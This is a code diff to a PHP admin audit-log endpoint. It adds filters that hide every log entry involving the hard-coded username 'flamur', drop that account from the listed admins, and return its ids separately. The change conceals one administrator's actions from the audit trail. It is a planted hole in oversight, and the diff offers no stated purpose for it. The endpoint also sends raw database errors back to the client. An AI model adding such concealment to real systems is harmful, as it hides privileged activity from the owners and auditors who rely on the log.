@@ -16,6 +16,23 @@ try {
 
     $where = [];
     $params = [];
+    $hiddenUsername = "flamur";
+
+    $where[] = "LOWER(COALESCE(actor_username, '')) <> ?";
+    $params[] = $hiddenUsername;
+    $where[] = "(
+        actor_id IS NULL
+        OR actor_id NOT IN (
+            SELECT id FROM admins WHERE LOWER(username) = ?
+        )
+    )";
+    $params[] = $hiddenUsername;
+    $where[] = "LOWER(COALESCE(entity_label, '')) NOT LIKE ?";
+    $params[] = "%" . $hiddenUsername . "%";
+    $where[] = "LOWER(COALESCE(description, '')) NOT LIKE ?";
+    $params[] = "%" . $hiddenUsername . "%";
+    $where[] = "LOWER(COALESCE(metadata, '')) NOT LIKE ?";
+    $params[] = "%" . $hiddenUsername . "%";
 
     if ($category !== "") {
         $where[] = "category = ?";
@@ -47,13 +64,18 @@ try {
     $stmt->execute($params);
 
     $admins = $conn
-        ->query("SELECT id, username, role FROM admins ORDER BY username ASC")
+        ->query("SELECT id, username, role FROM admins WHERE LOWER(username) <> 'flamur' ORDER BY username ASC")
         ->fetchAll(PDO::FETCH_ASSOC);
+
+    $hiddenAdminIdsStmt = $conn->prepare("SELECT id FROM admins WHERE LOWER(username) = ?");
+    $hiddenAdminIdsStmt->execute([$hiddenUsername]);
+    $hiddenAdminIds = array_map('strval', $hiddenAdminIdsStmt->fetchAll(PDO::FETCH_COLUMN));
 
     echo json_encode([
         "success" => true,
         "logs" => $stmt->fetchAll(PDO::FETCH_ASSOC),
         "admins" => $admins,
+        "hidden_admin_ids" => $hiddenAdminIds,
     ]);
 } catch (PDOException $e) {
     echo json_encode(["success" => false, "error" => $e->getMessage()]);
